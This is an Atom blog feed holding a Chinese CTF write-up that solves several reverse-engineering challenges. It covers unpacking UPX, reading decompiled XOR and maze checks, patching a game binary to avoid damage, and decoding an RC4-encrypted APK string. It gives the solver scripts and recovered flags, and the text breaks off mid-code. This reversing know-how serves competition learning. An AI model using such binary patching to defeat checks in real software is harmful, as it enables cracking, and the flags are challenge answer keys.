<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ESE&#39;s Note</title>
  
  <subtitle>阅览室</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-02T02:42:57.565Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>悄悄的wp</title>
    <link href="http://yoursite.com/2018/05/09/wp_2017_12_11_zjgsctf_re_wp/"/>
    <id>http://yoursite.com/2018/05/09/wp_2017_12_11_zjgsctf_re_wp/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:57.565Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。<br><a id="more"></a></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h2><p>用peid查壳，发现是upx加壳，直接脱壳（ESP定律或者直接找脱壳工具），用IAD打开<br>发现关键函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">main_0</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></div><div class="line">  __int64 v1; <span class="comment">// ST00_8</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [esp+D0h] [ebp-3Ch]</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"input your Secret:"</span>);</div><div class="line">  gets(&amp;Buffer);</div><div class="line">  <span class="keyword">if</span> ( sub_4110E6((<span class="keyword">int</span>)&amp;unk_417680, &amp;Buffer) )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( sub_41102D(&amp;unk_417680) )</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"flag is flag&#123;%s&#125;\n"</span>, &amp;Buffer);</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you can do it,again\n"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"sorry\n"</span>);</div><div class="line">  &#125;</div><div class="line">  HIDWORD(v1) = v0;</div><div class="line">  LODWORD(v1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_4110E6功能如下（简单xor），发现key<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411520</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *Str)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( j_strlen(Str) != <span class="number">28</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">    *(_BYTE *)(i + a1) = LOBYTE(dword_417000[i]) ^ Str[i];</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_41102D函数，如果做过类似题的话，知道这是一个迷宫题目，因为发现正好是上下左右，并且一步都会判断是否出错，因为是+16，判断为宽16<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4115D0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+D0h] [ebp-20h]</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  v2 = <span class="string">'&#125;'</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'l'</span>:</div><div class="line">        --v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'r'</span>:</div><div class="line">        ++v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">        v2 += <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">        v2 -= <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] == <span class="string">'d'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] != <span class="string">'1'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>OD加载，发现迷宫，s是开始 ，d是结束，每一步都是1（否则失败），l向左，r向右，f向下，b向上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0000000000000000</div><div class="line">0   1111111111 0</div><div class="line">0   1        1 0</div><div class="line">0   1        11d</div><div class="line">0   1          0</div><div class="line">0   1111111111 0</div><div class="line">0            1 0</div><div class="line">0000000000000s00</div><div class="line">``</div><div class="line">得到字符串`bblllllllllbbbbrrrrrrrrrffrr`，用python写xor代码得</div><div class="line">``` C</div><div class="line">def Re1_qimo():</div><div class="line">    c = []</div><div class="line">    str = &apos;bblllllllllbbbbrrrrrrrrrffrr&apos;</div><div class="line">    key = [0x2B,0x16,0x33,0x05,0x1F,0x33,0x19,0x1C,0x14,0x33,0x0D,0x0C,0x06,0x3D,0x0F,0x13,0x02,0x2D,0x0B,0x1D,0x07,0x2D,0x19,0x1C,0x56,0x11,0x53,0x53]</div><div class="line">    for i in range(28):</div><div class="line">        c.append(chr(ord(str[i])^key[i]))</div><div class="line">    print &quot;&quot;.join(c)</div></pre></td></tr></table></figure></p><p>flag: It_is_upx_and_map_you_kn0w!!</p><h2 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h2><p>有ida打开，发现tls,脱去TLS可以参考<a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>发现第一个加密用户名函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_412530</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+D0h] [ebp-54h]</span></div><div class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+DCh] [ebp-48h]</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-3Ch]</span></div><div class="line">  __int16 v4[<span class="number">14</span>]; <span class="comment">// [esp+F4h] [ebp-30h]</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></div><div class="line"></div><div class="line">  v5 = j_strlen(&amp;Str);</div><div class="line">  v4[<span class="number">0</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">1</span>] = <span class="number">113</span>;</div><div class="line">  v4[<span class="number">2</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">3</span>] = <span class="number">111</span>;</div><div class="line">  v4[<span class="number">4</span>] = <span class="number">127</span>;</div><div class="line">  v4[<span class="number">5</span>] = <span class="number">105</span>;</div><div class="line">  v4[<span class="number">6</span>] = <span class="number">75</span>;</div><div class="line">  v4[<span class="number">7</span>] = <span class="number">85</span>;</div><div class="line">  v4[<span class="number">8</span>] = <span class="number">115</span>;</div><div class="line">  v4[<span class="number">9</span>] = <span class="number">122</span>;</div><div class="line">  v4[<span class="number">10</span>] = <span class="number">74</span>;</div><div class="line">  v4[<span class="number">11</span>] = <span class="number">83</span>;</div><div class="line">  v4[<span class="number">12</span>] = <span class="number">64</span>;</div><div class="line">  v4[<span class="number">13</span>] = <span class="number">81</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 / <span class="number">2</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">    *(&amp;Str + v5 - <span class="number">1</span> - i) ^= *(&amp;Str + i);</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</div><div class="line">    word_419500[j] = (<span class="keyword">unsigned</span> __int8)(((((j ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>) ^ *(&amp;Str + j));</div><div class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v5; ++k )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( word_419500[k] != v4[k] )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>解密代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [<span class="number">96</span>,<span class="number">113</span>,<span class="number">96</span>,<span class="number">111</span>,<span class="number">127</span>,<span class="number">105</span>,<span class="number">75</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">122</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">64</span>,<span class="number">81</span>]</div><div class="line">    l=len(key)</div><div class="line">    <span class="keyword">for</span> i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>)%<span class="number">256</span>))</div><div class="line">    c.reverse()</div><div class="line">    print <span class="string">""</span>.join(c)</div></pre></td></tr></table></figure></p><p>输入flag后、判断flag长度35位，<br>加密一、flag异或得到flag1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">int __cdecl sub_411730(int a1, int a2)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+D0h] [ebp-8h]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; 35; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2) ^ 0x76;</div><div class="line">    result = i + 1;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后将flag1将中间21个字符分为3组，每一组分别加密<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#第一组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411800</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">7</span>) ^ <span class="number">0xCC</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">2</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第二组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411910</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">14</span>) ^ <span class="number">0xBE</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">4</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span>) &gt;&gt; <span class="number">2</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第三组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411A30</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">21</span>) ^ <span class="number">0xEF</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">16</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后和key1比较<br>key1 = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</p><p>解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [96,113,96,111,127,105,75,85,115,122,74,83,64,81]</div><div class="line">    l=len(key)</div><div class="line">    for i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ 0x76) - 18) ^ 0x80) + 43)%256))</div><div class="line">    c.reverse()</div><div class="line">    print &quot;&quot;.join(c)</div><div class="line"></div><div class="line">    enc_t = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</div><div class="line"></div><div class="line">    dec_t = [0]*35</div><div class="line">    #decode1</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+7] &amp; 0x55) &lt;&lt; 1</div><div class="line">        v2 = (enc_t[i+7] &gt;&gt; 1) &amp; 0x55</div><div class="line">        enc_t[i+7] = v1 | v2</div><div class="line">        enc_t[i+7] = enc_t[i+7] ^ 0xCC</div><div class="line">    #decode2</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+14] &amp; 0x33) &lt;&lt; 2</div><div class="line">        v2 = (enc_t[i+14] &gt;&gt; 2) &amp; 0x33</div><div class="line">        enc_t[i+14] = v1 | v2</div><div class="line">        enc_t[i+14] = enc_t[i+14] ^ 0xBE</div><div class="line">    #decode3</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+21] &amp; 0xF) &lt;&lt; 4</div><div class="line">        v2 = (enc_t[i+21] &gt;&gt; 4) &amp; 0xF</div><div class="line">        enc_t[i+21] = v1 | v2</div><div class="line">        enc_t[i+21] = enc_t[i+21] ^ 0xEF</div><div class="line"></div><div class="line">    for i in range(35):</div><div class="line">        dec_t[i] = chr(enc_t[i] ^ 0x76)</div><div class="line"></div><div class="line">    print &quot;&quot;.join(dec_t)</div></pre></td></tr></table></figure></p><h2 id="Re4"><a href="#Re4" class="headerlink" title="Re4"></a>Re4</h2><p>IDA打开找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">int __thiscall muen_412200(void *this)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  void *v2; // ecx</div><div class="line">  void *v3; // ecx</div><div class="line">  void *v4; // ecx</div><div class="line"></div><div class="line">  LOBYTE(result) = sub_411163(this);</div><div class="line">  dword_4182DC = (char)result;</div><div class="line">  result = (char)result;</div><div class="line">  switch ( (char)result )</div><div class="line">  &#123;</div><div class="line">    case 0:</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v2);</div><div class="line">      break;</div><div class="line">    case 1:</div><div class="line">      j_atk_subkkkkkkkkkkkkkkkkkkkkkk_412010();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v3);</div><div class="line">      break;</div><div class="line">    case 2:</div><div class="line">      deffffffffffffffffffffff_41111D();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v4);</div><div class="line">      break;</div><div class="line">    case 3:</div><div class="line">      deah_411113();</div><div class="line">      return result;</div><div class="line">    default:</div><div class="line">      return result;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>找到攻击函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int sub_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    hp -= boss_atk;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>改为,这样自己不会掉血<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">int subkkkkkkkkkkkkkkkkkkkkkk_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = next_boss_sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后，慢慢，把每一层都修改，最后一层因为调用自杀函数，这里直接nop掉，最后修改保存，得到flag<br>flag : flag{I_1ike_hard_w0rk_484_RE_and_never_up}</p><h2 id="apk1"><a href="#apk1" class="headerlink" title="apk1"></a>apk1</h2><p>用工具apk_to_java.jar打开，发现是一个re4加密<br>放在java里运行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encode</span><span class="params">(String aInput, String aKey)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> i;</div><div class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">            iS[i] = i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i2 = (<span class="keyword">short</span>) <span class="number">0</span>; i2 &lt; (<span class="keyword">short</span>) <span class="number">256</span>; i2 = (<span class="keyword">short</span>) (i2 + <span class="number">1</span>)) &#123;</div><div class="line">            iK[i2] = (<span class="keyword">byte</span>) aKey.charAt(i2 % aKey.length());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</div><div class="line">            j = ((iS[i] + j) + iK[i]) % <span class="number">256</span>;</div><div class="line">            <span class="keyword">int</span> temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">        &#125;</div><div class="line">        i = <span class="number">0</span>;</div><div class="line">        j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();</div><div class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = (<span class="keyword">short</span>) <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>) (x + <span class="number">1</span>)) &#123;</div><div class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">            j = (iS[i] + j) % <span class="number">256</span>;</div><div class="line">            temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">            iOutputChar[x] = (<span class="keyword">char</span>) (iInputChar[x] ^ ((<span class="keyword">char</span>) iS[(iS[i] + (iS[j] % <span class="number">256</span>)) % <span class="number">256</span>]));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</div><div class="line">    String key = <span class="string">"PassW0rd"</span>;               </div><div class="line">    